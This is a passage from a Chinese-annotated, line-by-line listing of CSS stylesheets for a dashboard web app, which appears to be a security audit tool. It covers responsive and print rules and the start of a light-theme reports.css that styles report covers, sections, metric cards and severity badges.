| 1897 | 空行：分隔样式规则。 | `&nbsp;` |
| 1898 | 选择器：指定接下来要设置样式的页面元素。 | `.login-card__brand {` |
| 1899 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: flex;` |
| 1900 | 样式属性：设置 `align-items` 的视觉或布局效果。 | `  align-items: center;` |
| 1901 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-sm);` |
| 1902 | 样式属性：设置 `margin-bottom` 的视觉或布局效果。 | `  margin-bottom: var(--space-md);` |
| 1903 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-h2);` |
| 1904 | 样式属性：设置 `font-weight` 的视觉或布局效果。 | `  font-weight: 600;` |
| 1905 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1906 | 空行：分隔样式规则。 | `&nbsp;` |
| 1907 | 选择器：指定接下来要设置样式的页面元素。 | `.login-card__subtitle {` |
| 1908 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--text-secondary);` |
| 1909 | 样式属性：设置 `margin-bottom` 的视觉或布局效果。 | `  margin-bottom: var(--space-lg);` |
| 1910 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-caption);` |
| 1911 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1912 | 空行：分隔样式规则。 | `&nbsp;` |
| 1913 | 样式注释：说明这一段 CSS 的用途。 | `/* =============================================================` |
| 1914 | 样式注释：说明这一段 CSS 的用途。 | ` * 响应式断点 — DESIGN.md §10` |
| 1915 | 样式注释：说明这一段 CSS 的用途。 | ` * ============================================================= */` |
| 1916 | 选择器：指定接下来要设置样式的页面元素。 | `@media (max-width: 1439px) {` |
| 1917 | 选择器：指定接下来要设置样式的页面元素。 | `  .metrics-grid {` |
| 1918 | 样式属性：设置 `grid-template-columns` 的视觉或布局效果。 | `    grid-template-columns: repeat(4, minmax(0, 1fr));` |
| 1919 | 规则结束：结束当前 CSS 选择器的样式定义。 | `  }` |
| 1920 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1921 | 空行：分隔样式规则。 | `&nbsp;` |
| 1922 | 选择器：指定接下来要设置样式的页面元素。 | `@media (max-width: 1279px) {` |
| 1923 | 选择器：指定接下来要设置样式的页面元素。 | `  .metrics-grid {` |
| 1924 | 样式属性：设置 `grid-template-columns` 的视觉或布局效果。 | `    grid-template-columns: repeat(3, minmax(0, 1fr));` |
| 1925 | 规则结束：结束当前 CSS 选择器的样式定义。 | `  }` |
| 1926 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1927 | 空行：分隔样式规则。 | `&nbsp;` |
| 1928 | 选择器：指定接下来要设置样式的页面元素。 | `@media (max-width: 1023px) {` |
| 1929 | 选择器：指定接下来要设置样式的页面元素。 | `  .sidebar {` |
| 1930 | 样式属性：设置 `width` 的视觉或布局效果。 | `    width: var(--sidebar-collapsed);` |
| 1931 | 规则结束：结束当前 CSS 选择器的样式定义。 | `  }` |
| 1932 | 样式语句：参与页面视觉布局。 | `  .sidebar .sidebar__label,` |
| 1933 | 选择器：指定接下来要设置样式的页面元素。 | `  .sidebar .sidebar__status span {` |
| 1934 | 样式属性：设置 `display` 的视觉或布局效果。 | `    display: none;` |
| 1935 | 规则结束：结束当前 CSS 选择器的样式定义。 | `  }` |
| 1936 | 选择器：指定接下来要设置样式的页面元素。 | `  .metrics-grid {` |
| 1937 | 样式属性：设置 `grid-template-columns` 的视觉或布局效果。 | `    grid-template-columns: repeat(2, minmax(0, 1fr));` |
| 1938 | 规则结束：结束当前 CSS 选择器的样式定义。 | `  }` |
| 1939 | 样式语句：参与页面视觉布局。 | `  .grid-2,` |
| 1940 | 选择器：指定接下来要设置样式的页面元素。 | `  .grid-2--even {` |
| 1941 | 样式属性：设置 `grid-template-columns` 的视觉或布局效果。 | `    grid-template-columns: 1fr;` |
| 1942 | 规则结束：结束当前 CSS 选择器的样式定义。 | `  }` |
| 1943 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1944 | 空行：分隔样式规则。 | `&nbsp;` |
| 1945 | 选择器：指定接下来要设置样式的页面元素。 | `@media (max-width: 767px) {` |
| 1946 | 选择器：指定接下来要设置样式的页面元素。 | `  .page-body {` |
| 1947 | 样式属性：设置 `padding` 的视觉或布局效果。 | `    padding: var(--space-md);` |
| 1948 | 规则结束：结束当前 CSS 选择器的样式定义。 | `  }` |
| 1949 | 选择器：指定接下来要设置样式的页面元素。 | `  .topbar {` |
| 1950 | 样式属性：设置 `padding` 的视觉或布局效果。 | `    padding: var(--space-sm) var(--space-md);` |
| 1951 | 规则结束：结束当前 CSS 选择器的样式定义。 | `  }` |
| 1952 | 选择器：指定接下来要设置样式的页面元素。 | `  .menu-toggle {` |
| 1953 | 样式属性：设置 `display` 的视觉或布局效果。 | `    display: inline-flex;` |
| 1954 | 规则结束：结束当前 CSS 选择器的样式定义。 | `  }` |
| 1955 | 选择器：指定接下来要设置样式的页面元素。 | `  .sidebar {` |
| 1956 | 样式属性：设置 `position` 的视觉或布局效果。 | `    position: fixed;` |
| 1957 | 样式属性：设置 `left` 的视觉或布局效果。 | `    left: 0;` |
| 1958 | 样式属性：设置 `top` 的视觉或布局效果。 | `    top: 0;` |
| 1959 | 样式属性：设置 `height` 的视觉或布局效果。 | `    height: 100vh;` |
| 1960 | 样式属性：设置 `width` 的视觉或布局效果。 | `    width: var(--sidebar-width);` |
| 1961 | 样式属性：设置 `transform` 的视觉或布局效果。 | `    transform: translateX(-100%);` |
| 1962 | 样式属性：设置 `transition` 的视觉或布局效果。 | `    transition: transform 0.2s ease;` |
| 1963 | 规则结束：结束当前 CSS 选择器的样式定义。 | `  }` |
| 1964 | 选择器：指定接下来要设置样式的页面元素。 | `  .sidebar.is-open {` |
| 1965 | 样式属性：设置 `transform` 的视觉或布局效果。 | `    transform: translateX(0);` |
| 1966 | 规则结束：结束当前 CSS 选择器的样式定义。 | `  }` |
| 1967 | 样式语句：参与页面视觉布局。 | `  .sidebar .sidebar__label,` |
| 1968 | 选择器：指定接下来要设置样式的页面元素。 | `  .sidebar .sidebar__status span {` |
| 1969 | 样式属性：设置 `display` 的视觉或布局效果。 | `    display: block;` |
| 1970 | 规则结束：结束当前 CSS 选择器的样式定义。 | `  }` |
| 1971 | 选择器：指定接下来要设置样式的页面元素。 | `  .metrics-grid {` |
| 1972 | 样式属性：设置 `grid-template-columns` 的视觉或布局效果。 | `    grid-template-columns: repeat(2, minmax(0, 1fr));` |
| 1973 | 样式属性：设置 `gap` 的视觉或布局效果。 | `    gap: var(--space-sm);` |
| 1974 | 规则结束：结束当前 CSS 选择器的样式定义。 | `  }` |
| 1975 | 选择器：指定接下来要设置样式的页面元素。 | `  .chart {` |
| 1976 | 样式属性：设置 `height` 的视觉或布局效果。 | `    height: 240px;` |
| 1977 | 规则结束：结束当前 CSS 选择器的样式定义。 | `  }` |
| 1978 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 1979 | 空行：分隔样式规则。 | `&nbsp;` |
| 1980 | 样式注释：说明这一段 CSS 的用途。 | `/* 打印：关掉深色背景，打印友好（不影响浏览） */` |
| 1981 | 选择器：指定接下来要设置样式的页面元素。 | `@media print {` |
| 1982 | 样式语句：参与页面视觉布局。 | `  body,` |
| 1983 | 样式语句：参与页面视觉布局。 | `  .card,` |
| 1984 | 选择器：指定接下来要设置样式的页面元素。 | `  .metric-card {` |
| 1985 | 样式属性：设置 `background` 的视觉或布局效果。 | `    background: #fff !important;` |
| 1986 | 样式属性：设置 `color` 的视觉或布局效果。 | `    color: #111 !important;` |
| 1987 | 规则结束：结束当前 CSS 选择器的样式定义。 | `  }` |
| 1988 | 样式语句：参与页面视觉布局。 | `  .sidebar,` |
| 1989 | 样式语句：参与页面视觉布局。 | `  .topbar,` |
| 1990 | 选择器：指定接下来要设置样式的页面元素。 | `  .menu-toggle {` |
| 1991 | 样式属性：设置 `display` 的视觉或布局效果。 | `    display: none !important;` |
| 1992 | 规则结束：结束当前 CSS 选择器的样式定义。 | `  }` |
| 1993 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |

## `web/static/css/reports.css`

- 类型：前端静态资源
- 行数：439

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 样式注释：说明这一段 CSS 的用途。 | `/* =============================================================` |
| 2 | 样式注释：说明这一段 CSS 的用途。 | ` * reports.css — 审计报告浅色模式（DESIGN.md §2.5 / §4.9 / §8.6）` |
| 3 | 样式注释：说明这一段 CSS 的用途。 | ` *` |
| 4 | 样式注释：说明这一段 CSS 的用途。 | ` * 设计约束：` |
| 5 | 样式注释：说明这一段 CSS 的用途。 | ` *   - :root[data-theme="report"] 上重绑核心令牌 → 骨架自动变浅` |
| 6 | 样式注释：说明这一段 CSS 的用途。 | ` *   - 不修改其它页面（只匹配 data-theme="report"）` |
| 7 | 样式注释：说明这一段 CSS 的用途。 | ` *   - 打印友好：无斑马纹、黑白化图表线、隐藏侧栏/顶栏/交互按钮` |
| 8 | 样式注释：说明这一段 CSS 的用途。 | ` * ============================================================= */` |
| 9 | 空行：分隔样式规则。 | `&nbsp;` |
| 10 | 选择器：指定接下来要设置样式的页面元素。 | `:root[data-theme="report"] {` |
| 11 | 样式注释：说明这一段 CSS 的用途。 | `  /* -- 报告专用令牌（DESIGN §2.5）-- */` |
| 12 | 样式属性：设置 `--report-white` 的视觉或布局效果。 | `  --report-white: #FFFFFF;` |
| 13 | 样式属性：设置 `--report-surface` 的视觉或布局效果。 | `  --report-surface: #F9FAFB;` |
| 14 | 样式属性：设置 `--report-surface-alt` 的视觉或布局效果。 | `  --report-surface-alt: #F3F4F6;` |
| 15 | 样式属性：设置 `--report-border` 的视觉或布局效果。 | `  --report-border: #E5E7EB;` |
| 16 | 样式属性：设置 `--report-border-strong` 的视觉或布局效果。 | `  --report-border-strong: #111827;` |
| 17 | 样式属性：设置 `--report-text` 的视觉或布局效果。 | `  --report-text: #111827;` |
| 18 | 样式属性：设置 `--report-text-secondary` 的视觉或布局效果。 | `  --report-text-secondary: #4B5563;` |
| 19 | 样式属性：设置 `--report-text-tertiary` 的视觉或布局效果。 | `  --report-text-tertiary: #6B7280;` |
| 20 | 空行：分隔样式规则。 | `&nbsp;` |
| 21 | 样式注释：说明这一段 CSS 的用途。 | `  /* -- 覆写基础令牌（骨架与通用组件随之变浅）-- */` |
| 22 | 样式属性：设置 `--bg-void` 的视觉或布局效果。 | `  --bg-void: var(--report-white);` |
| 23 | 样式属性：设置 `--surface-dark` 的视觉或布局效果。 | `  --surface-dark: var(--report-surface);` |
| 24 | 样式属性：设置 `--surface-mid` 的视觉或布局效果。 | `  --surface-mid: var(--report-surface);` |
| 25 | 样式属性：设置 `--surface-raised` 的视觉或布局效果。 | `  --surface-raised: var(--report-surface-alt);` |
| 26 | 样式属性：设置 `--border-subtle` 的视觉或布局效果。 | `  --border-subtle: var(--report-border);` |
| 27 | 样式属性：设置 `--border-default` 的视觉或布局效果。 | `  --border-default: var(--report-border);` |
| 28 | 样式属性：设置 `--text-primary` 的视觉或布局效果。 | `  --text-primary: var(--report-text);` |
| 29 | 样式属性：设置 `--text-secondary` 的视觉或布局效果。 | `  --text-secondary: var(--report-text-secondary);` |
| 30 | 样式属性：设置 `--text-tertiary` 的视觉或布局效果。 | `  --text-tertiary: var(--report-text-tertiary);` |
| 31 | 样式属性：设置 `--accent-emerald-glow` 的视觉或布局效果。 | `  --accent-emerald-glow: rgba(16, 185, 129, 0.08);` |
| 32 | 空行：分隔样式规则。 | `&nbsp;` |
| 33 | 样式属性：设置 `color-scheme` 的视觉或布局效果。 | `  color-scheme: light;` |
| 34 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 35 | 空行：分隔样式规则。 | `&nbsp;` |
| 36 | 样式注释：说明这一段 CSS 的用途。 | `/* 让全局选区、滚动条也符合浅色语义 */` |
| 37 | 选择器：指定接下来要设置样式的页面元素。 | `:root[data-theme="report"] body {` |
| 38 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--report-white);` |
| 39 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--report-text);` |
| 40 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 41 | 空行：分隔样式规则。 | `&nbsp;` |
| 42 | 选择器：指定接下来要设置样式的页面元素。 | `:root[data-theme="report"] ::-webkit-scrollbar-track {` |
| 43 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--report-surface);` |
| 44 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 45 | 选择器：指定接下来要设置样式的页面元素。 | `:root[data-theme="report"] ::-webkit-scrollbar-thumb {` |
| 46 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: #D1D5DB;` |
| 47 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 48 | 空行：分隔样式规则。 | `&nbsp;` |
| 49 | 样式注释：说明这一段 CSS 的用途。 | `/* 主图表容器在浅色模式下使用白底 */` |
| 50 | 选择器：指定接下来要设置样式的页面元素。 | `:root[data-theme="report"] .chart {` |
| 51 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--report-white);` |
| 52 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 53 | 空行：分隔样式规则。 | `&nbsp;` |
| 54 | 样式注释：说明这一段 CSS 的用途。 | `/* 徽章（威胁/IOC/等级）在浅色模式下保留原语义色，但降低底色透明度以便打印 */` |
| 55 | 选择器：指定接下来要设置样式的页面元素。 | `:root[data-theme="report"] .badge--low {` |
| 56 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: #1D4ED8;` |
| 57 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: rgba(59, 130, 246, 0.1);` |
| 58 | 样式属性：设置 `border-color` 的视觉或布局效果。 | `  border-color: rgba(59, 130, 246, 0.3);` |
| 59 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 60 | 选择器：指定接下来要设置样式的页面元素。 | `:root[data-theme="report"] .badge--medium {` |
| 61 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: #B45309;` |
| 62 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: rgba(245, 158, 11, 0.1);` |
| 63 | 样式属性：设置 `border-color` 的视觉或布局效果。 | `  border-color: rgba(245, 158, 11, 0.3);` |
| 64 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 65 | 选择器：指定接下来要设置样式的页面元素。 | `:root[data-theme="report"] .badge--high {` |
| 66 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: #B91C1C;` |
| 67 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: rgba(239, 68, 68, 0.1);` |
| 68 | 样式属性：设置 `border-color` 的视觉或布局效果。 | `  border-color: rgba(239, 68, 68, 0.3);` |
| 69 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 70 | 选择器：指定接下来要设置样式的页面元素。 | `:root[data-theme="report"] .badge--critical {` |
| 71 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: #BE185D;` |
| 72 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: rgba(236, 72, 153, 0.1);` |
| 73 | 样式属性：设置 `border-color` 的视觉或布局效果。 | `  border-color: rgba(236, 72, 153, 0.3);` |
| 74 | 样式属性：设置 `animation` 的视觉或布局效果。 | `  animation: none; /* 打印不要脉冲 */` |
| 75 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 76 | 空行：分隔样式规则。 | `&nbsp;` |
| 77 | 样式注释：说明这一段 CSS 的用途。 | `/* 侧栏在报告模式下变浅 */` |
| 78 | 选择器：指定接下来要设置样式的页面元素。 | `:root[data-theme="report"] .sidebar {` |
| 79 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--report-surface-alt);` |
| 80 | 样式属性：设置 `border-right` 的视觉或布局效果。 | `  border-right: 1px solid var(--report-border);` |
| 81 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 82 | 空行：分隔样式规则。 | `&nbsp;` |
| 83 | 选择器：指定接下来要设置样式的页面元素。 | `:root[data-theme="report"] .sidebar__item {` |
| 84 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--report-text-secondary);` |
| 85 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 86 | 空行：分隔样式规则。 | `&nbsp;` |
| 87 | 选择器：指定接下来要设置样式的页面元素。 | `:root[data-theme="report"] .sidebar__item.is-active {` |
| 88 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--accent-emerald-glow);` |
| 89 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: #065F46;` |
| 90 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 91 | 空行：分隔样式规则。 | `&nbsp;` |
| 92 | 选择器：指定接下来要设置样式的页面元素。 | `:root[data-theme="report"] .topbar {` |
| 93 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--report-white);` |
| 94 | 样式属性：设置 `border-bottom` 的视觉或布局效果。 | `  border-bottom: 1px solid var(--report-border);` |
| 95 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 96 | 空行：分隔样式规则。 | `&nbsp;` |
| 97 | 选择器：指定接下来要设置样式的页面元素。 | `:root[data-theme="report"] .topbar__title {` |
| 98 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--report-text);` |
| 99 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 100 | 空行：分隔样式规则。 | `&nbsp;` |
| 101 | 样式注释：说明这一段 CSS 的用途。 | `/* 卡片：DESIGN §4.9 — 白底、1px 浅灰边框、12px 圆角 */` |
| 102 | 选择器：指定接下来要设置样式的页面元素。 | `:root[data-theme="report"] .card {` |
| 103 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--report-white);` |
| 104 | 样式属性：设置 `border` 的视觉或布局效果。 | `  border: 1px solid var(--report-border);` |
| 105 | 样式属性：设置 `border-radius` 的视觉或布局效果。 | `  border-radius: 12px;` |
| 106 | 样式属性：设置 `box-shadow` 的视觉或布局效果。 | `  box-shadow: none;` |
| 107 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 108 | 空行：分隔样式规则。 | `&nbsp;` |
| 109 | 样式注释：说明这一段 CSS 的用途。 | `/* 报告段落主体 */` |
| 110 | 选择器：指定接下来要设置样式的页面元素。 | `.report-root {` |
| 111 | 样式属性：设置 `max-width` 的视觉或布局效果。 | `  max-width: 960px;` |
| 112 | 样式属性：设置 `margin` 的视觉或布局效果。 | `  margin: 0 auto;` |
| 113 | 样式属性：设置 `font-family` 的视觉或布局效果。 | `  font-family: var(--font-sans);` |
| 114 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--report-text);` |
| 115 | 样式属性：设置 `line-height` 的视觉或布局效果。 | `  line-height: 1.7;` |
| 116 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 117 | 空行：分隔样式规则。 | `&nbsp;` |
| 118 | 选择器：指定接下来要设置样式的页面元素。 | `.report-cover {` |
| 119 | 样式属性：设置 `padding` 的视觉或布局效果。 | `  padding: var(--space-xl) 0 var(--space-lg);` |
| 120 | 样式属性：设置 `border-bottom` 的视觉或布局效果。 | `  border-bottom: 2px solid var(--report-border-strong);` |
| 121 | 样式属性：设置 `margin-bottom` 的视觉或布局效果。 | `  margin-bottom: var(--space-xl);` |
| 122 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: flex;` |
| 123 | 样式属性：设置 `align-items` 的视觉或布局效果。 | `  align-items: flex-end;` |
| 124 | 样式属性：设置 `justify-content` 的视觉或布局效果。 | `  justify-content: space-between;` |
| 125 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-lg);` |
| 126 | 样式属性：设置 `flex-wrap` 的视觉或布局效果。 | `  flex-wrap: wrap;` |
| 127 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 128 | 空行：分隔样式规则。 | `&nbsp;` |
| 129 | 选择器：指定接下来要设置样式的页面元素。 | `.report-cover__title {` |
| 130 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-display);` |
| 131 | 样式属性：设置 `font-weight` 的视觉或布局效果。 | `  font-weight: 700;` |
| 132 | 样式属性：设置 `margin` 的视觉或布局效果。 | `  margin: 0 0 var(--space-xs);` |
| 133 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--report-text);` |
| 134 | 样式属性：设置 `letter-spacing` 的视觉或布局效果。 | `  letter-spacing: -0.01em;` |
| 135 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 136 | 空行：分隔样式规则。 | `&nbsp;` |
| 137 | 选择器：指定接下来要设置样式的页面元素。 | `.report-cover__subtitle {` |
| 138 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--report-text-secondary);` |
| 139 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-body);` |
| 140 | 样式属性：设置 `margin` 的视觉或布局效果。 | `  margin: 0;` |
| 141 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 142 | 空行：分隔样式规则。 | `&nbsp;` |
| 143 | 选择器：指定接下来要设置样式的页面元素。 | `.report-cover__meta {` |
| 144 | 样式属性：设置 `font-family` 的视觉或布局效果。 | `  font-family: var(--font-mono);` |
| 145 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--report-text-tertiary);` |
| 146 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-caption);` |
| 147 | 样式属性：设置 `text-align` 的视觉或布局效果。 | `  text-align: right;` |
| 148 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 149 | 空行：分隔样式规则。 | `&nbsp;` |
| 150 | 选择器：指定接下来要设置样式的页面元素。 | `.report-toolbar {` |
| 151 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: flex;` |
| 152 | 样式属性：设置 `align-items` 的视觉或布局效果。 | `  align-items: center;` |
| 153 | 样式属性：设置 `justify-content` 的视觉或布局效果。 | `  justify-content: space-between;` |
| 154 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-md);` |
| 155 | 样式属性：设置 `margin` 的视觉或布局效果。 | `  margin: 0 auto var(--space-lg);` |
| 156 | 样式属性：设置 `max-width` 的视觉或布局效果。 | `  max-width: 960px;` |
| 157 | 样式属性：设置 `flex-wrap` 的视觉或布局效果。 | `  flex-wrap: wrap;` |
| 158 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 159 | 空行：分隔样式规则。 | `&nbsp;` |
| 160 | 选择器：指定接下来要设置样式的页面元素。 | `.report-toolbar__actions {` |
| 161 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: flex;` |
| 162 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-sm);` |
| 163 | 样式属性：设置 `flex-wrap` 的视觉或布局效果。 | `  flex-wrap: wrap;` |
| 164 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 165 | 空行：分隔样式规则。 | `&nbsp;` |
| 166 | 样式注释：说明这一段 CSS 的用途。 | `/* 报告段落 */` |
| 167 | 选择器：指定接下来要设置样式的页面元素。 | `.report-section {` |
| 168 | 样式属性：设置 `margin-bottom` 的视觉或布局效果。 | `  margin-bottom: var(--space-2xl);` |
| 169 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 170 | 空行：分隔样式规则。 | `&nbsp;` |
| 171 | 选择器：指定接下来要设置样式的页面元素。 | `.report-section__title {` |
| 172 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-h1);` |
| 173 | 样式属性：设置 `font-weight` 的视觉或布局效果。 | `  font-weight: 600;` |
| 174 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--report-text);` |
| 175 | 样式属性：设置 `margin` 的视觉或布局效果。 | `  margin: 0 0 var(--space-md);` |
| 176 | 样式属性：设置 `padding-bottom` 的视觉或布局效果。 | `  padding-bottom: var(--space-xs);` |
| 177 | 样式属性：设置 `border-bottom` 的视觉或布局效果。 | `  border-bottom: 2px solid var(--report-border-strong);` |
| 178 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 179 | 空行：分隔样式规则。 | `&nbsp;` |
| 180 | 选择器：指定接下来要设置样式的页面元素。 | `.report-section__subtitle {` |
| 181 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--report-text-tertiary);` |
| 182 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-caption);` |
| 183 | 样式属性：设置 `margin` 的视觉或布局效果。 | `  margin: -6px 0 var(--space-md);` |
| 184 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 185 | 空行：分隔样式规则。 | `&nbsp;` |
| 186 | 选择器：指定接下来要设置样式的页面元素。 | `.report-section__body {` |
| 187 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--report-surface);` |
| 188 | 样式属性：设置 `border` 的视觉或布局效果。 | `  border: 1px solid var(--report-border);` |
| 189 | 样式属性：设置 `border-radius` 的视觉或布局效果。 | `  border-radius: 12px;` |
| 190 | 样式属性：设置 `padding` 的视觉或布局效果。 | `  padding: var(--space-lg);` |
| 191 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 192 | 空行：分隔样式规则。 | `&nbsp;` |
| 193 | 样式注释：说明这一段 CSS 的用途。 | `/* 概览指标卡网格 */` |
| 194 | 选择器：指定接下来要设置样式的页面元素。 | `.report-overview {` |
| 195 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: grid;` |
| 196 | 样式属性：设置 `grid-template-columns` 的视觉或布局效果。 | `  grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));` |
| 197 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: var(--space-md);` |
| 198 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 199 | 空行：分隔样式规则。 | `&nbsp;` |
| 200 | 选择器：指定接下来要设置样式的页面元素。 | `.report-metric {` |
| 201 | 样式属性：设置 `background` 的视觉或布局效果。 | `  background: var(--report-white);` |
| 202 | 样式属性：设置 `border` 的视觉或布局效果。 | `  border: 1px solid var(--report-border);` |
| 203 | 样式属性：设置 `border-radius` 的视觉或布局效果。 | `  border-radius: 8px;` |
| 204 | 样式属性：设置 `padding` 的视觉或布局效果。 | `  padding: var(--space-md);` |
| 205 | 样式属性：设置 `display` 的视觉或布局效果。 | `  display: flex;` |
| 206 | 样式属性：设置 `flex-direction` 的视觉或布局效果。 | `  flex-direction: column;` |
| 207 | 样式属性：设置 `gap` 的视觉或布局效果。 | `  gap: 4px;` |
| 208 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 209 | 空行：分隔样式规则。 | `&nbsp;` |
| 210 | 选择器：指定接下来要设置样式的页面元素。 | `.report-metric__label {` |
| 211 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-caption);` |
| 212 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--report-text-tertiary);` |
| 213 | 样式属性：设置 `text-transform` 的视觉或布局效果。 | `  text-transform: uppercase;` |
| 214 | 样式属性：设置 `letter-spacing` 的视觉或布局效果。 | `  letter-spacing: 0.04em;` |
| 215 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 216 | 空行：分隔样式规则。 | `&nbsp;` |
| 217 | 选择器：指定接下来要设置样式的页面元素。 | `.report-metric__value {` |
| 218 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-h1);` |
| 219 | 样式属性：设置 `font-weight` 的视觉或布局效果。 | `  font-weight: 600;` |
| 220 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--report-text);` |
| 221 | 样式属性：设置 `font-variant-numeric` 的视觉或布局效果。 | `  font-variant-numeric: tabular-nums;` |
| 222 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 223 | 空行：分隔样式规则。 | `&nbsp;` |
| 224 | 选择器：指定接下来要设置样式的页面元素。 | `.report-metric__hint {` |
| 225 | 样式属性：设置 `font-size` 的视觉或布局效果。 | `  font-size: var(--fs-caption);` |
| 226 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: var(--report-text-tertiary);` |
| 227 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 228 | 空行：分隔样式规则。 | `&nbsp;` |
| 229 | 选择器：指定接下来要设置样式的页面元素。 | `.report-metric--danger .report-metric__value {` |
| 230 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: #B91C1C;` |
| 231 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 232 | 选择器：指定接下来要设置样式的页面元素。 | `.report-metric--warning .report-metric__value {` |
| 233 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: #B45309;` |
| 234 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 235 | 选择器：指定接下来要设置样式的页面元素。 | `.report-metric--success .report-metric__value {` |
| 236 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: #047857;` |
| 237 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 238 | 选择器：指定接下来要设置样式的页面元素。 | `.report-metric--info .report-metric__value {` |
| 239 | 样式属性：设置 `color` 的视觉或布局效果。 | `  color: #1D4ED8;` |
| 240 | 规则结束：结束当前 CSS 选择器的样式定义。 | `}` |
| 241 | 空行：分隔样式规则。 | `&nbsp;` |
| 242 | 样式注释：说明这一段 CSS 的用途。 | `/* 威胁统计：左饼 + 右条 / 下方时间线 */` |
